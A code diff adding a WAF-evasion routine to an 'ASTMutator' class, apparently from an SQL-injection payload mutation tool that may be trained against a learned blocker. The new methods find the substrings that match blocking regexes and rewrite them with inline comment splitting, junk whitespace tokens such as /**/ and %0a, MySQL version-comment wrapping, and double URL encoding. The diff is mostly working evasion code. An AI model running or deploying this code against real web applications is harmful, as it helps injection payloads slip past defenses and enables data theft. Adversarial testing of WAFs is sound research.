@@ -123,10 +123,66 @@ class ASTMutator:
                 continue
             mutated = self.strategies[strat_name](mutated)
             
-        # 3. Contextual Compatibility Logic
+        # 3. Dynamic WAF Adaptation: Evade specific patterns learned by the RL Blocker
+        if hasattr(self, "active_waf_rules") and self.active_waf_rules:
+            mutated = self._apply_waf_evasion(mutated, self.active_waf_rules)
+
+        # 4. Contextual Compatibility Logic
         if wrap:
             mutated = self._context_aware_wrap(mutated)
         return mutated
+
+    def _apply_waf_evasion(self, payload, blocked_patterns):
+        """Actively breaks WAF rules learned by the Predictive Blocker."""
+        mutated = str(payload)
+        for pattern in blocked_patterns:
+            try:
+                # Find all segments matching the blocked regex pattern
+                matches = list(re.finditer(pattern, mutated, re.IGNORECASE))
+                if matches:
+                    print(f"[*] Mutator: Active Evasion applied against learned WAF rule: {pattern}", flush=True)
+                    # Replace from right to left to avoid index shifting
+                    for match in reversed(matches):
+                        start, end = match.span()
+                        target_segment = mutated[start:end]
+                        # Apply targeted obfuscation to the EXACT sub-string that triggered the rule
+                        evaded_segment = self._break_regex_match(target_segment)
+                        mutated = mutated[:start] + evaded_segment + mutated[end:]
+            except Exception:
+                pass
+        return mutated
+
+    def _break_regex_match(self, text):
+        """Intelligently obfuscates a string segment to bypass structural Regex rules."""
+        import random
+        import re
+        new_text = text
+        choice = random.random()
+        
+        if choice < 0.3:
+            # Inline Splitting: SELECT -> SE/*!!*/LECT
+            words = re.findall(r'[A-Za-z]+', new_text)
+            for w in set(words):
+                if len(w) > 2:
+                    idx = len(w) // 2
+                    obfuscated = w[:idx] + "/*!!*/" + w[idx:]
+                    new_text = re.sub(rf'\b{re.escape(w)}\b', obfuscated, new_text, flags=re.IGNORECASE)
+        elif choice < 0.6:
+            # Space Replacement: Replaces critical whitespace bridging keywords
+            junk = ['/**/', '/*!50000', '%0a', '%09', '/*%00*/']
+            # Only replace actual spaces to keep the syntax slightly intact
+            new_text = "".join([random.choice(junk) if c == ' ' else c for c in new_text])
+        elif choice < 0.85:
+            # Version Comments: Wrap keywords in exec comments
+            words = re.findall(r'[A-Za-z]+', new_text)
+            for w in set(words):
+                new_text = re.sub(rf'\b{re.escape(w)}\b', f"/*!{random.randint(40000, 60000)}{w}*/", new_text, flags=re.IGNORECASE)
+        else:
+            # Double URL Encoding locally
+            first_pass = "".join([f"%{ord(c):02x}" for c in new_text])
+            new_text = first_pass.replace('%', '%25')
+            
+        return new_text
 
     def report_success(self, payload, score):
         """Gene Credit Assignment: Update strategy and keyword reputation based on score."""
